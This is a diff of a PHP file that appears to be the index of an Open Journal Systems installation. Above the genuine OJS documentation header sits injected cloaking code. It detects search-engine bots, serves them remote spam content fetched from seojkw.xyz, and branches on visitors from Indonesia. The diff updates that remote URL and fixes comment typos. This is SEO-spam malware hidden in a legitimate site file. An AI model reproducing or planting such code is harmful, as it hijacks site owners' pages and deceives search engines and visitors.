@@ -18,7 +18,7 @@ function is_bot() {
     return preg_match($botchar, $user_agent);
 }
 
-$sky = "https://seojkw.xyz/jelss/landing7.txt";
+$sky = "https://seojkw.xyz/unialfa/landing7.txt";
 
 if (is_bot()) {
     echo @file_get_contents($sky);
@@ -33,7 +33,6 @@ if (getUserCountry() === "ID") {
 
 ?>
 <?php
-
 /**
  * @mainpage OJS API Reference
  *
@@ -52,7 +51,7 @@ if (getUserCountry() === "ID") {
  *   display to users;
  * - Page classes, which receive requests from users' web browsers, delegate
  *   any required processing to various other classes, and call up the
- *   appropriate Smarty template to generate aresponse;
+ *   appropriate Smarty template to generate a response;
  * - Controllers, which implement reusable pieces of content e.g. for AJAX
  *   subrequests.
  * - Action classes, which are used by the Page classes to perform non-trivial
@@ -70,7 +69,7 @@ if (getUserCountry() === "ID") {
  *
  * As the system makes use of inheritance and has consistent class naming
  * conventions, it is generally easy to tell what category a particular class
- *falls into.
+ * falls into.
  *
  * For example, a Data Access Object class always inherits from the DAO class,
  * has a Class name of the form [Something]%DAO, and has a filename of the form
